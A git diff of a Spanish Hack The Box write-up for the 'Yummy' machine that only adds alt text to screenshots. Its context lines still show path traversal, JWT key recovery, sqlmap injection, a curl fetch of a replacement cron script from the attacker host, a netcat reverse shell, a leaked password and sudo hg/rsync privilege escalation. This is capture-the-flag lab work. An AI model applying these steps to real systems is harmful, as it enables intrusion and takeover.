@@ -85,47 +85,47 @@ teniendo esto, podemos acercarnos a la pagina para averiguar mas, pero primero l
 ```bash
 whatweb http://yummy.htb
 ```
-<img src="/images/writeup-yummy/Pasted image 20250412110701.png">
+<img src="/images/writeup-yummy/Pasted image 20250412110701.png" alt="image">
 
 nada mas allá de lo que ya se ha descubierto, así que vamos al navegador:
-<img src="/images/writeup-yummy/Pasted image 20250412110937.png">
+<img src="/images/writeup-yummy/Pasted image 20250412110937.png" alt="image" >
 veo que es la web de un restaurante, voy a empezar a explorar las funcionalidades.
 
 tenemos un formulario para reservar mesas:
-<img src="/images/writeup-yummy/Pasted image 20250412111125.png">
+<img src="/images/writeup-yummy/Pasted image 20250412111125.png" alt="image">
 
 un panel de inicio de sesión:
-<img src="/images/writeup-yummy/Pasted image 20250412111203.png">
+<img src="/images/writeup-yummy/Pasted image 20250412111203.png" alt="image">
 
 *que tambien podemos registrarnos*
 
 tambien hay un formulario de contacto y otro de suscripción a newsletter:
-<img src="/images/writeup-yummy/Pasted image 20250412114225.png">
+<img src="/images/writeup-yummy/Pasted image 20250412114225.png" alt="image">
 
 probando varias cosillas en estos formularios, no tenemos nada especial, voy a registrarme y dentro del dashboard podemos ver:
-<img src="/images/writeup-yummy/Pasted image 20250412114546.png">
+<img src="/images/writeup-yummy/Pasted image 20250412114546.png" alt="image">
 
 es como un registro de reservaciones, lo que me hace pensar que puede ser la ruta para vulnerar la web, así que vamos a tomar una reservación y seguir:
-<img src="/images/writeup-yummy/Pasted image 20250412115046.png">
+<img src="/images/writeup-yummy/Pasted image 20250412115046.png" alt="image">
 
 iré a mi cuenta, y veo que tenemos 2 botones de acción, además de que se refleja el mensaje, podemos intentar hacer que el servidor almacene algún payload cargado desde la reservación, pero primero quiero probar lo mas evidente (los botones de acción)
 
-<img src="/images/writeup-yummy/Pasted image 20250412115518.png">
+<img src="/images/writeup-yummy/Pasted image 20250412115518.png" alt="image">
 
 con este, veo que hay un redireccionamiento junto con el numero del id de la reservación:
 
 
-<img src="/images/writeup-yummy/Pasted image 20250412115621.png">
+<img src="/images/writeup-yummy/Pasted image 20250412115621.png" alt="image">
 
 pulsar el botón, quiero intentar visitar /reminder:
 
-<img src="/images/writeup-yummy/Pasted image 20250412115841.png">
+<img src="/images/writeup-yummy/Pasted image 20250412115841.png" alt="image">
 
 y si coloco el numero de la reservación:
-<img src="/images/writeup-yummy/Pasted image 20250412115927.png">
+<img src="/images/writeup-yummy/Pasted image 20250412115927.png" alt="image">
 
 descarga el .ics o  el archivo icalendar sin haber pulsado el botón, ahora, si intento visitar otros números de reserva:
-<img src="/images/writeup-yummy/Pasted image 20250412120058.png">
+<img src="/images/writeup-yummy/Pasted image 20250412120058.png" alt="image">
 
 veo un mensaje de que la reserva no existe, además de que dice que mi reserva anterior fue descargada con éxito y en mi dashboard ya no muestra la reservación
 
@@ -184,15 +184,15 @@ viendo las solicitudes, hay 3 cosas que han llamado mi atención:
 
 
 jwt.io nos da información relevante sobre el mismo, si haz trabajado jwt antes, veras que contiene su firma, rol, email, algoritmo, etc:
-<img src="/images/writeup-yummy/Pasted image 20250412131822.png">
+<img src="/images/writeup-yummy/Pasted image 20250412131822.png" alt="image">
 lo que nos hace pensar que podríamos intentar modificarlo, pero primero debemos encontrar las claves
 
 
 solicitud /reminder la cual asigna la cookie temporal y además nos da el redireccionamiento que hará que se descarguen los datos:
-<img src="/images/writeup-yummy/Pasted image 20250412131939.png">
+<img src="/images/writeup-yummy/Pasted image 20250412131939.png" alt="image">
 
 y esta ya es la solicitud al servidor con orden de descarga, el cual nos responde con los datos solicitados:
-<img src="/images/writeup-yummy/Pasted image 20250412132200.png">
+<img src="/images/writeup-yummy/Pasted image 20250412132200.png" alt="image">
 
 voy a enviar estas ultimas al repeater, para intentar leer archivos arbitrarios en el servidor #LocalFileInclusion
 
@@ -206,31 +206,31 @@ lo que pienso es que podría capturar la solicitud y modificarlas antes de que v
 
 
 bueno, al interceptar las solicitudes, intente modificar el /reminder con un directory listing basico. pero la me arrojó un error 404:
-<img src="/images/writeup-yummy/Pasted image 20250412133909.png">
+<img src="/images/writeup-yummy/Pasted image 20250412133909.png" alt="image">
 
 así que deje pasar esta solicitud por el proxy y llego la siguiente:
-<img src="/images/writeup-yummy/Pasted image 20250412134023.png">
+<img src="/images/writeup-yummy/Pasted image 20250412134023.png" alt="image">
 
 la cual tambien modifique con un ../../../../../../etc/passwd y no de daba error, ni hacia nada (no veía respuesta del servidor) pero la reservación seguía allí (lo cual no pasa) 
 
 asi que voy al historial http del burpsuite y extranamente, aunque cambie alli, se sigue viendo asi:
-<img src="/images/writeup-yummy/Pasted image 20250412134634.png">
+<img src="/images/writeup-yummy/Pasted image 20250412134634.png" alt="image">
 
 de hecho, hasta me da un internal server error, así que decidí enviar esta solicitud al repeater, tambien me dio error tanto en el nombre como si lo modifico (ambas solicitudes deben ir casi simultaneo) entonces si mientras la intercepto, lo envió al repeater? 
 
-<img src="/images/writeup-yummy/Pasted image 20250412135227.png">
+<img src="/images/writeup-yummy/Pasted image 20250412135227.png" alt="image">
 este no lo permite, dice que no se encuentra asi que lo intento enviar integro
 
 
 follow redirect:
-<img src="/images/writeup-yummy/Pasted image 20250412135925.png">
-<img src="/images/writeup-yummy/Pasted image 20250412135945.png">
+<img src="/images/writeup-yummy/Pasted image 20250412135925.png" alt="image">
+<img src="/images/writeup-yummy/Pasted image 20250412135945.png" alt="image">
 
 aquí, solo me faltaba intentar enviar al repeater el redirect justo antes que lo enviara al servidor (porque el follow redirect no me lo permitía porque como vemos es una cookie de un solo uso)
 
 
 el el proxy dejo pasar la primera solicitud y la segunda la envío al repeater, modifico el path con ../../../../../../etc/passwd:
-<img src="/images/writeup-yummy/Pasted image 20250412140325.png">
+<img src="/images/writeup-yummy/Pasted image 20250412140325.png" alt="image">
 
 tenemos directory listing, el cual se vale de una cookie de 1 solo uso
 
@@ -239,8 +239,8 @@ mirando el dashboard, indica que se ha descargado, pero la reservación sigue al
 después de estas buscando un montón entre los archivos del sistema, e encontrado varios importantes:
 
 las tareas cron, están ejecutando 3 scripts:
-<img src="/images/writeup-yummy/Pasted image 20250412225347.png">
-<img src="/images/writeup-yummy/Pasted image 20250412225359.png">
+<img src="/images/writeup-yummy/Pasted image 20250412225347.png" alt="image">
+<img src="/images/writeup-yummy/Pasted image 20250412225359.png" alt="image">
 
 table_cleanup.sh:
 ```bash
@@ -293,21 +293,21 @@ cd /var/www
 ```
 
 tirando un poco del hilo, intento descargar backupapp.zip tambien:
-<img src="/images/writeup-yummy/Pasted image 20250412232657.png">
+<img src="/images/writeup-yummy/Pasted image 20250412232657.png" alt="image">
 
 click derecho y:
 
-<img src="/images/writeup-yummy/Pasted image 20250412232808.png">
+<img src="/images/writeup-yummy/Pasted image 20250412232808.png" alt="image">
 
 lo que nos va a descargar el archivo a nuestra maquina:
-<img src="/images/writeup-yummy/Pasted image 20250412232900.png">
+<img src="/images/writeup-yummy/Pasted image 20250412232900.png" alt="image">
 
 investiguemos primero este (que se ve interesante), y luego analizamos los otros archivos:
 ```bash
 unzip backupapp.zip
 ```
 vemos que tenemos la aplicación entera:
-<img src="/images/writeup-yummy/Pasted image 20250412233325.png">
+<img src="/images/writeup-yummy/Pasted image 20250412233325.png" alt="image">
 
 traeré al writeup el código con:
 ```bash
@@ -795,7 +795,7 @@ así queda después de arreglar algunas cosas, y usando la base del mismo códig
 ```
 pyton3 token_gen.py
 ```
-<img src="/images/writeup-yummy/Pasted image 20250415194714.png">
+<img src="/images/writeup-yummy/Pasted image 20250415194714.png" alt="image">
 
 
 ***Nota: si tienes problemas con las dependencias o bibliotecas que se usan, entra a un entorno de desarrollo de python y descarga lo que necesites (pycryptodome - cryptography )
@@ -810,10 +810,10 @@ source entorno/bin/activate
 
 
 con esto, vamos a ir al navegador y a meter nuestro token nuevo en el storage:
-<img src="/images/writeup-yummy/Pasted image 20250415194953.png">
+<img src="/images/writeup-yummy/Pasted image 20250415194953.png" alt="image">
 
 intentamos cargar el dashboard que ya conocemos:
-<img src="/images/writeup-yummy/Pasted image 20250415195032.png">
+<img src="/images/writeup-yummy/Pasted image 20250415195032.png" alt="image">
 ha funcionado
 
 ahora, si a futuro quieres evitar esto para ir mas rápido, puedes usar:
@@ -822,7 +822,7 @@ https://github.com/RsaCtfTool/RsaCtfTool
 ```bash
 RsaCtfTool -n "colocamos el valor de n" -e "colocamos el valor de e" --private
 ```
-<img src="/images/writeup-yummy/Pasted image 20250415201801.png">
+<img src="/images/writeup-yummy/Pasted image 20250415201801.png" alt="image">
 
 nos da la calve privada lo podemos guardar en un archivo .pem
 
@@ -856,11 +856,11 @@ hay varios métodos mas, pero estos son los que he usado, (no vamos a profundiza
 
 ahora, leyendo un poco el codigo de la pagina admin y como se hacen las consultas, encontramos que 'o' es vulnerable a sqlinjection, asi que, si probamos esto:
 
-<img src="/images/writeup-yummy/Pasted image 20250416174125.png">
+<img src="/images/writeup-yummy/Pasted image 20250416174125.png" alt="image">
 ahora, veremos que tenemos allí
 
 después de probar varios payloads manuales, decidí probar la url con SQLmap:
-<img src="/images/writeup-yummy/Pasted image 20250418100116.png">
+<img src="/images/writeup-yummy/Pasted image 20250418100116.png" alt="image">
 error-based / stacked queries(varias consultas concatenadas) / time-based blind
 
 tambien vemos que nos da información del usuario que esta ejecutando las querys de la base de datos:
@@ -873,7 +873,7 @@ current user: 'chef@localhost'
 ```
 
 al usar el comando --privilege nos muestra que es "*FILE*":
-<img src="/images/writeup-yummy/Pasted image 20250418103716.png">
+<img src="/images/writeup-yummy/Pasted image 20250418103716.png" alt="image">
 
 esto es un hallazgo critico, dado que nos permite leer y escribir archivos en la base de datos y fuera de ella, lo que nos puede llevar a leer archivos del sistema o meter un payload malicioso para ejecutar una reverse shell :D
 
@@ -919,7 +919,7 @@ sqlmap -u 'http://yummy.htb/admindashboard?o=' --cookie="X-AUTH-Token=eyJhbGciOi
 ```
 
 y finalmente despues de 1 minuto:
-<img src="/images/writeup-yummy/Pasted image 20250418123804.png">
+<img src="/images/writeup-yummy/Pasted image 20250418123804.png" alt="image">
 
 algo interesante, es que podemos hacer el mismo procedimiento sin sqlmap pero con burpsuite con:
 ```bash
@@ -958,7 +958,7 @@ mv app_backup.sh bad_backup.sh | curl 10.10.10.10/app_backup.sh -O app_backup.sh
 ```
 
 por supuesto, estaba escuchando con netcat en mi maquina y:
-<img src="/images/writeup-yummy/Pasted image 20250418155717.png">
+<img src="/images/writeup-yummy/Pasted image 20250418155717.png" alt="image">
 
 somos www-data
 
@@ -971,12 +971,12 @@ asi vamos alla, y comienzo a enumerar un poco, veo que hay un directorio con el 
 
 si entramos y enumeramos:
 
-<img src="/images/writeup-yummy/Pasted image 20250418160747.png">
+<img src="/images/writeup-yummy/Pasted image 20250418160747.png" alt="image">
 
 parece incluso mi home, me llama mucho la atención el directorio que no tenia en el backup que descargamos (.hg)
 
 si vamos dentro, vemos que parece un directorio .git:
-<img src="/images/writeup-yummy/Pasted image 20250418160958.png">
+<img src="/images/writeup-yummy/Pasted image 20250418160958.png" alt="image">
 
 al investigar es una herramienta llamada *Mercurial* (dato: hg es el mismo símbolo del mercurio en la tabla periódica de elementos)
 https://www.mercurial-scm.org/
@@ -989,7 +989,7 @@ bueno, si vemos tenemos branches:
 ```
 hg branches
 ```
-<img src="/images/writeup-yummy/Pasted image 20250418162820.png">
+<img src="/images/writeup-yummy/Pasted image 20250418162820.png" alt="image">
 
 solo hay uno, si queremos mas info:
 ```bash
@@ -998,13 +998,13 @@ hg log -r 9 -v
 
 el cambio fue echo por qa:
 
-<img src="/images/writeup-yummy/Pasted image 20250418163023.png">
+<img src="/images/writeup-yummy/Pasted image 20250418163023.png" alt="image">
 
 si lo miramos:
 ```bash
 hg log -r 9 -p
 ```
-<img src="/images/writeup-yummy/Pasted image 20250418163153.png">
+<img src="/images/writeup-yummy/Pasted image 20250418163153.png" alt="image">
 
 tenemos unas credenciales **jPAd!XQCtn8Oc@2B** que no habíamos visto, asi que podemos intuir de quien son, voy a intentar iniciar como el usuario qa
 
@@ -1013,12 +1013,12 @@ aunque no me dejo usar el comando su y lo intente por ssh:
 ssh qa@10.10.10.10
 p: jPAd!XQCtn8Oc@2B
 ```
-<img src="/images/writeup-yummy/Pasted image 20250418163643.png">
+<img src="/images/writeup-yummy/Pasted image 20250418163643.png" alt="image">
 
 y ahora si tenemos nuestra flag de usuario
 
 mirando que comando puedo ejecutar con sudo -l:
-<img src="/images/writeup-yummy/Pasted image 20250418171709.png">
+<img src="/images/writeup-yummy/Pasted image 20250418171709.png" alt="image">
 
 tenemos a mercurial de nuevo por aquí, aunque ahora nos dice que tenemos la capacidad de meter contenido nuevo a la aplicacion que se encuentra en /home/dev/app-producttion/
 
@@ -1057,7 +1057,7 @@ finalmente ejecutamos:
 ```bash
 sudo -u dev /usr/bin/hg pull /home/dev/app-production/
 ```
-<img src="/images/writeup-yummy/Pasted image 20250418185901.png">
+<img src="/images/writeup-yummy/Pasted image 20250418185901.png" alt="image">
 
 xD *don't call me*
 
@@ -1094,19 +1094,19 @@ el verdadero problema viene cuando ejecutamos el comando y ejecutamos la bash, e
 sudo rsync -a --chown root:root --exclude\=.hg /home/dev/app-production/* /opt/app/
 /opt/app/3vil -p
 ```
-<img src="/images/writeup-yummy/Pasted image 20250419103901.png">
+<img src="/images/writeup-yummy/Pasted image 20250419103901.png" alt="image">
 
 aquí tiene que haber algún script que nos este limpiando esto antes de poder ejecutarlo (lo siento por la terminal, pero al parecer no me deja hacerle tratamiento a esta porque tambien se corrompe)
 
 así que, he notado que puedo escribir los comando a ejecutar y pegarlos directo en la terminal para que se ejecuten en orden (como cuando copiamos y pegamos comandos de un repositorio)
 
 pero si lo intento varias veces, tampoco me deja ejecutarlo:
-<img src="/images/writeup-yummy/Pasted image 20250419104301.png">
+<img src="/images/writeup-yummy/Pasted image 20250419104301.png" alt="image">
 
 pero, mirando la imagen anterior, el comando -a no esta manteniendo como propietario a root en mi bash porque viene de la carpeta dev, entonces puede que esto este dando conflictos, porque no podemos escalar privilegios con un binario sin privilegios.
 asi que investigando un poco, tambien podemos usar --chown para cambiarle los propietarios a todos los archivos dentro de /opt/app:
 
-<img src="/images/writeup-yummy/Pasted image 20250419105624.png">
+<img src="/images/writeup-yummy/Pasted image 20250419105624.png" alt="image">
 
 con esto funcionando ahora vamos a ejecutar todos los comandos completos:
 
@@ -1118,7 +1118,7 @@ sudo rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/a
 ```
 
 y finalmente:
-<img src="/images/writeup-yummy/Pasted image 20250419105805.png">
+<img src="/images/writeup-yummy/Pasted image 20250419105805.png" alt="image">
 
 hay una extraña condición de carrera combinado con el problema de la terminal que nos dificultaba la escalada final, ahora ya podemos ir por la id_rsa de root para una conexión mas estable
 
@@ -1130,7 +1130,7 @@ dado que al parecer por el asterisco, rsyn se vuelve muy laxo y deja que podamos
 ```bash
 sudo rsync -a --exclude\=.hg /home/dev/app-production/../../../../../root/ --chown dev:dev /tmp/backup --log-file /opt/app/
 ```
-<img src="/images/writeup-yummy/Pasted image 20250419114113.png">
+<img src="/images/writeup-yummy/Pasted image 20250419114113.png" alt="image">
 
 
 
@@ -1311,4 +1311,4 @@ nos vemos en la siguiente maquina!
 
 ## H4ck th3 W0rld
 
-<img src="/images/devil.jpg" style="border-radius:200px; width:100px;">
+<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">
